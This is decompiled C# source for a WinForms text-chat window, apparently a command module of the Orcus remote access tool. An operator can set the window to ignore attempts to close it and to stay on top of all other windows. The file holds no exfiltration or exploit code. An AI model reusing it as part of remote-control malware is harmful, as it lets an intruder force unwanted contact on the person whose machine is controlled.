using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;
using Orcus.Commands.TextChat.Utilities;
using Orcus.Native;
using Orcus.Shared.Commands.TextChat;

namespace Orcus.Commands.TextChat;

public class TextChatForm : Form
{
	private readonly ChatSettings _chatSettings;

	private readonly Color _meColor = Color.FromArgb(43, 192, 105);

	private readonly Color _otherColor = Color.FromArgb(41, 128, 185);

	private bool _isClosing;

	private IContainer components;

	private RichTextBox MainRichTextBox;

	private TextBox MessageTextBox;

	private Button SendButton;

	public bool IsClosed { get; set; }

	public event EventHandler<SendTextMessageEventArgs> SendMessage;

	public TextChatForm(ChatSettings chatSettings)
	{
		//IL_0057: Unknown result type (might be due to invalid IL or missing references)
		//IL_0061: Expected O, but got Unknown
		_chatSettings = chatSettings;
		InitializeComponent();
		((Control)this).set_Text(chatSettings.get_Title());
		((Control)MessageTextBox).add_KeyDown(new KeyEventHandler(MessageTextBox_KeyDown));
	}

	protected override void OnShown(EventArgs e)
	{
		((Form)this).OnShown(e);
		((Control)this).Show();
	}

	public void ForceClose()
	{
		_isClosing = true;
		((Form)this).Close();
	}

	public void MessageReceived(DateTime timestamp, string message)
	{
		((Control)this).BeginInvoke((Delegate)(Action)delegate
		{
			MainRichTextBox.AppendText($"[{timestamp.ToShortTimeString()} {_chatSettings.get_YourName()}]: {message}\r\n", _otherColor);
			MainRichTextBox.ScrollToEnd();
		});
	}

	private void MessageTextBox_KeyDown(object sender, KeyEventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Invalid comparison between Unknown and I4
		if ((int)e.get_KeyCode() == 13)
		{
			SendText();
			e.set_SuppressKeyPress(true);
		}
	}

	protected override void OnClosing(CancelEventArgs e)
	{
		((Form)this).OnClosing(e);
		e.Cancel = _chatSettings.get_PreventClose() && !_isClosing;
	}

	protected override void OnClosed(EventArgs e)
	{
		((Form)this).OnClosed(e);
		IsClosed = true;
	}

	private void SendButton_Click(object sender, EventArgs e)
	{
		SendText();
	}

	private void SendText()
	{
		string text = ((Control)MessageTextBox).get_Text();
		if (!string.IsNullOrEmpty(text))
		{
			MainRichTextBox.AppendText($"[{DateTime.Now.ToShortTimeString()} Me]: {text}\r\n", _meColor);
			MainRichTextBox.ScrollToEnd();
			((Control)MessageTextBox).set_Text((string)null);
			this.SendMessage?.Invoke(this, new SendTextMessageEventArgs(text));
		}
	}

	private void MessageTextBox_TextChanged(object sender, EventArgs e)
	{
		((Control)SendButton).set_Enabled(!string.IsNullOrEmpty(((Control)MessageTextBox).get_Text()));
	}

	private void MainForm_Load(object sender, EventArgs e)
	{
		((ContainerControl)this).set_ActiveControl((Control)(object)MessageTextBox);
		((Form)this).Activate();
		if (_chatSettings.get_Topmost())
		{
			NativeMethods.SetWindowPos(((Control)this).get_Handle(), new IntPtr(-1), 0, 0, 0, 0, SetWindowPosFlags.IgnoreMove | SetWindowPosFlags.IgnoreResize | SetWindowPosFlags.ShowWindow);
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0228: Unknown result type (might be due to invalid IL or missing references)
		//IL_0232: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(TextChatForm));
		MainRichTextBox = new RichTextBox();
		MessageTextBox = new TextBox();
		SendButton = new Button();
		((Control)this).SuspendLayout();
		((Control)MainRichTextBox).set_Anchor((AnchorStyles)13);
		((Control)MainRichTextBox).set_BackColor(Color.White);
		((Control)MainRichTextBox).set_Location(new Point(12, 12));
		((Control)MainRichTextBox).set_Name("MainRichTextBox");
		((TextBoxBase)MainRichTextBox).set_ReadOnly(true);
		((Control)MainRichTextBox).set_Size(new Size(545, 306));
		((Control)MainRichTextBox).set_TabIndex(0);
		((Control)MainRichTextBox).set_Text("");
		MessageTextBox.set_AcceptsReturn(true);
		((Control)MessageTextBox).set_Anchor((AnchorStyles)14);
		((Control)MessageTextBox).set_Location(new Point(12, 324));
		((Control)MessageTextBox).set_Name("MessageTextBox");
		((Control)MessageTextBox).set_Size(new Size(472, 20));
		((Control)MessageTextBox).set_TabIndex(1);
		((Control)MessageTextBox).add_TextChanged((EventHandler)MessageTextBox_TextChanged);
		((Control)SendButton).set_Location(new Point(490, 322));
		((Control)SendButton).set_Name("SendButton");
		((Control)SendButton).set_Size(new Size(67, 23));
		((Control)SendButton).set_TabIndex(2);
		((Control)SendButton).set_Text("Send");
		((ButtonBase)SendButton).set_UseVisualStyleBackColor(true);
		((Control)SendButton).add_Click((EventHandler)SendButton_Click);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(569, 356));
		((Control)this).get_Controls().Add((Control)(object)SendButton);
		((Control)this).get_Controls().Add((Control)(object)MessageTextBox);
		((Control)this).get_Controls().Add((Control)(object)MainRichTextBox);
		((Form)this).set_FormBorderStyle((FormBorderStyle)3);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Control)this).set_Name("MainForm");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).add_Load((EventHandler)MainForm_Load);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
